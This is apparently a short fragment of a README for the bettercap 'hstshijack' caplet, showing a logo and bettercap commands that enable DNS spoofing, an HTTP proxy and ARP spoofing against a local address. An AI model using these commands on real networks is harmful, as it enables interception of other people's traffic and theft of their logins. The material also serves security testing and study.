<p align="center">
  <img width="420px" src="https://cdn.jsdelivr.net/gh/yungtravla/cdn@ccdc3b8d/github.com/bettercap/caplets/hstshijack/logo.svg" />
</p>
...
dns.spoof    on
http.proxy   on
set arp.spoof.targets 192.168.43.228
arp.spoof on
```
